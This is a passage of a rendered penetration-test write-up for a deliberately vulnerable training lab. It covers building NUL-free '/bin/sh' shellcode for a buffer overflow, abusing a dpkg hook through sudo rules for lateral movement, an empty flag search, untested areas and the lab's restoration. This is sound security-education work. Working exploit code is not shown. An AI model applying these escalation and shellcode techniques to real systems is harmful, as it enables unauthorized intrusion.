+<h3 id="64-little-endian-immediates-and-a-self-inflicted-string">6.4 Little-endian immediates, and a self-inflicted string</h3>
+<p>After 6.3, <code>execve</code> failed with <code>ENOENT</code> on <code>&quot;nib/n/sh&quot;</code> — <code>push 0x2f62696e</code> stores the
+bytes <code>6e 69 62 2f</code> = <code>&quot;nib/&quot;</code>, because x86 is little-endian. Fixing that produced
+<code>&quot;/binn/sh&quot;</code>, because the second push already contained the <code>/</code> I was adding. Building
+<code>&quot;/bin/sh\0&quot;</code> from <code>push</code> immediates then collides with 6.2: the literal <code>&quot;/sh\0&quot;</code>
+immediate contains a NUL and <code>strcpy</code> truncates on it.</p>
+<p>Resolved by pushing <code>&quot;/sh!&quot;</code> and overwriting the filler byte through a zeroed register,
+all with NUL-free encodings — and, critically, by <strong>emulating the stack in the self-test</strong>:</p>
+<pre><code class="language-python">push32(0x2168732F); push32(0x6E69622F); mem[esp+7] = 0
+assert bytes(mem[esp:esp+8]) == b&quot;/bin/sh\x00&quot;
+</code></pre>
+<p>That emulation caught the <code>&quot;/bin//sh&quot;</code> variant <em>before</em> it reached the target, and it now
+ships as part of the exploit's <code>self_test()</code>.</p>
+<h3 id="65-two-harness-defects-that-produced-a-plausible-wrong-identity">6.5 Two harness defects that produced a <em>plausible wrong identity</em></h3>
+<p>Both of these nearly caused a misreported finding, and both are the &quot;control that cannot
+fail&quot; shape:</p>
+<ul>
+<li><strong>Stale output file.</strong> <code>/tmp</code> is sticky and a file <code>maci</code> created is <code>0644</code>, so
+<code>darksblack</code> could not overwrite it. <code>cat</code> returned <code>maci</code>'s <em>earlier</em> output. The
+reported identity was one step behind the real one, and the output was
+well-formed — a plausible answer, not an error. Fixed by using a unique path per call.</li>
+<li><strong>Compound hook value.</strong> <code>dpkg</code> splits <code>--pre-invoke</code> on <code>;</code>, so a <code>{ a; b; }</code> group
+was shredded and the run produced no output. This reads exactly like &quot;the escalation
+does not work.&quot;</li>
+</ul>
+<p>Neither would have been caught by re-running; only by making the harness's <em>identity</em> and
+<em>freshness</em> properties explicit.</p>
+<h3 id="66-a-lesson-about-reading-a-trace">6.6 A lesson about reading a trace</h3>
+<p>I initially misread the strace line <code>execve(&quot;nib/n/sh&quot;, ...)</code> as a pointer 3 bytes off,
+and nearly went looking for a stack-alignment bug. The pointer was exactly <code>esp</code>; the
+<em>bytes at</em> <code>esp</code> were wrong. One <code>struct.pack</code> check settled it. This is
+<code>decision-making.md</code>'s &quot;recompute before you accuse&quot; — the accusation here was against my
+own exploit, and it was as wrong as the ones the methodology warns about.</p>
+<hr />
+<h2 id="7-no-reward-artifact-exists">7. No reward artifact exists</h2>
+<p>There is no <code>FLAG{}</code>, no flag file, and no completion text in this image. Reported as an
+absence with evidence rather than filled in.</p>
+<p>Operator-level search (root, whole container filesystem, excluding <code>/proc</code>, <code>/sys</code>,
+<code>/dev</code>):</p>
+<pre><code>$ grep -rIl -E 'FLAG\{|flag\{|CTF\{|flag:' / 2&gt;/dev/null
+/usr/share/doc/shared-mime-info/shared-mime-info-spec.html/x34.html
+/usr/share/gdb/python/gdb/command/pretty_printers.py
+/usr/share/vim/vim90/doc/spell.txt
+/usr/share/perl/5.36.0/diagnostics.pm
+... (all distribution documentation)
+
+$ find / -xdev \( -iname 'flag*' -o -iname '*congratulations*' \
+      -o -iname '*recompensa*' -o -iname '*.flag' \) 2&gt;/dev/null \
+    | grep -viE 'zoneinfo|terminfo|man/|include/|doc/'
+/var/www/html/.archivos-secretos
+</code></pre>
+<p>Every hit is a false positive from vim/perl/gdb docs. The single name match is the secret
+directory itself.</p>
+<p>The lab author's own <code>/root/.bash_history</code> is deployment verification, not a reward:</p>
+<pre><code>whoami
+id
+exit
+cd /var/www/
+nano script.sh
+hostname -I
+</code></pre>
+<p><code>[lab-home]/darksblack/.viminfo</code> is likewise the author's scratch (<code>:!bash</code>, <code>:/bin/bash</code>) —
+evidence about <em>intent</em> while building the serial check, not about reachability, per
+<code>decision-making.md</code> §7.</p>
+<p><strong>Therefore the success condition for this lab is the chain itself</strong>: unauthenticated
+<code>tcp/9000</code> → <code>www-data</code> → <code>maci</code> → <code>darksblack</code>, with no authentication at any stage.</p>
+<hr />
+<h2 id="8-what-was-not-tested">8. What was not tested</h2>
+<ul>
+<li><strong>SSH (22/tcp).</strong> Open, and never used. No credential was found for <code>maci</code> or
+<code>darksblack</code>; the chain never needed one, so password spraying against it was not
+attempted and is not claimed as covered.</li>
+<li><strong>Root.</strong> Not reached and not shown to be reachable — see F-08. &quot;Not reachable from
+<code>darksblack</code>&quot; is a bounded claim about the paths enumerated, not a proof of
+impossibility.</li>
+<li><strong>The serial value.</strong> F-07 recovered the obfuscated literal but not the plaintext,
+because F-06 makes the gate irrelevant. Deliberate, not an oversight.</li>
+<li><strong>Race conditions on the 2-second supervisor loop.</strong> Not probed. Repeated crashes were
+observed to self-heal, which is all that is claimed.</li>
+<li><strong>32-bit vs 64-bit differential behaviour.</strong> Only 32-bit paths were exercised; the
+container is amd64 with <code>ia32</code> compatibility.</li>
+</ul>
+<hr />
+<h2 id="9-lab-design-observation">9. Lab design observation</h2>
+<p>The lab teaches one thing unusually well and one thing not at all.</p>
+<p><strong>Well: the privilege ladder is a sudo graph, not a vertical.</strong> Neither <code>www-data</code> nor
+<code>maci</code> can escalate to root anywhere in this image. Every hop is a <code>sudo</code> rule that
+<em>changes principal</em> (<code>www-data → maci</code>, <code>maci → darksblack</code>) rather than a privilege
+escalation. That is a good model of what lateral movement actually looks like in a
+correctly configured estate, and it means the honest answer to &quot;did you get root&quot; is
+&quot;there is no root here&quot;, which is a more useful lesson than another <code>chmod 777</code>.</p>
+<p><strong>Not at all: the web tier is decoration.</strong> <code>index.php</code> and <code>efemerides.php</code> are static
+pages, <code>manager.php</code> only discloses, and the advertised buffer overflow is on a raw port
+the description never mentions. A learner who reads the description and starts in the
+browser will not find the first stage. The description <em>names</em> both classes correctly
+(unlike the previous five labs), but it points at the wrong component for the first one.</p>
+<p><strong>The unfixed gap a lab author should close:</strong> the pickle stage is advertised as the
+second stage, yet it ships disabled (<code>serial=off</code>). A learner who follows the
+description, lands on <code>time.py</code>, sees <code>La serialización está deshabilitada</code>, and has no
+signal that the interesting part is that the <em>gate's own config file is world-writable</em>.
+The intended lesson — a control that works and is voided by its permissions — is real and
+good, but nothing in the lab points at it, and the advertised stage reads as broken
+rather than as a permissions puzzle. Shipping it <code>serial=on</code> with the config <code>0644 root:root</code> would make the same lesson teachable by accident of omission.</p>
+<hr />
+<h2 id="10-restoration">10. Restoration</h2>
+<p>The lab was returned to its shipped state and verified byte-identical where it matters.</p>
+<table>
+<thead>
+<tr>
+<th>Item</th>
+<th>Action</th>
+<th>Verification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/opt/data.pk1</code></td>
+<td>overwritten with the image's own copy</td>
+<td><code>md5sum</code> = <code>3a633f1b185111700e84bfd80a86db97</code>, size 143, mode <code>666 root:root</code> — <strong>matches pristine</strong></td>
+</tr>
+<tr>
+<td><code>[lab-home]/maci/.time_seri/time.conf</code></td>
+<td>overwritten with the image's own copy</td>
+<td>content <code>serial=off</code>, size 11, mode <code>666 maci:maci</code> — <strong>matches pristine</strong></td>
+</tr>
+<tr>
+<td><code>/tmp/*</code></td>
+<td>all 26 artifacts I created removed</td>
+<td><code>/tmp</code> holds only <code>.data2.log</code> and <code>logs.log</code>, the two files present at container start</td>
+</tr>
+<tr>
+<td><code>gdb</code>, <code>strace</code></td>
+<td>installed by me for diagnosis; purged</td>
+<td><code>which gdb strace</code> → not found</td>
+</tr>
+<tr>
+<td>scratch binaries (<code>bitlock_9999</code>, <code>bitselftest</code>)</td>
+<td>removed, processes killed</td>
+<td><code>ps aux</code> shows only the shipped <code>bitlock</code></td>
+</tr>
+</tbody>
+</table>
+<p>Both modified files were restored from copies extracted from the <strong>image itself</strong>, not
+from a transcription, so the md5 comparison is against pristine bytes rather than
+against my own memory of them.</p>
+<p><code>/tmp/logs.log</code> grows continuously by design — the supervisor appends to it every 2
+seconds — so it is not byte-identical and is not claimed to be. It is the shipped
+supervisor's own log and was never edited by me.</p>
+<p>Post-restore functional check, all passing: <code>index.php</code> → <code>200</code>, <code>manager.php</code> → <code>200</code>,
+<code>tcp/9000</code> accepting connections, <code>time.py</code> → <code>La serialización está deshabilitada</code>.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
